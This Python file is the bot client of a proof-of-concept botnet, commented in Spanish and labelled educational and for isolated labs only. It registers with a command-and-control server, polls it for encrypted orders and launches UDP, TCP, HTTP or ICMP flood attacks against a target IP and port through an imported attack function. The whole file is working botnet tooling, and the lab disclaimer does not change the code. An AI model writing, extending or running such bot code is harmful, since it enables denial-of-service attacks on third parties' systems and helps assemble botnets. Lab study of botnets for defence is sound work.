#!/usr/bin/env python3
"""
Bot / zombie - PoC educativa de botnet.
Pregunta al C&C por su orden mediante polling HTTP y la ejecuta.
Uso solo en un laboratorio aislado y controlado.
"""
import socket
import time
import requests
from crypto import descifrar

CC = "http://localhost:8000"
BOT_ID = "bot1"

# Tamano del paquete que mandamos a la victima
PAYLOAD = b"X" * 1024

from ataques import lanzar_ataque

def ejecutar(orden):
    tipo = orden.get("tipo")        # "udp" / "tcp" / "http" / "icmp"
    p = orden.get("parametros", {})
    lanzar_ataque(
        tipo,
        p.get("ip"),
        int(p.get("puerto", 0)),
        int(p.get("duracion", 10)),
        hilos=int(p.get("hilos", 4)),
        tam=int(p.get("tam", 1024)),
        ruta=p.get("parametros_http", {}).get("ruta", "/") if isinstance(p.get("ruta"), dict) else p.get("ruta", "/"),
    )

if __name__ == "__main__":
    requests.post(f"{CC}/registro", json={"id": BOT_ID})
    while True:
        r = requests.get(f"{CC}/ordenes/{BOT_ID}")
        if r.content:
            orden = descifrar(r.content)
            if orden:
                ejecutar(orden)
        time.sleep(5)
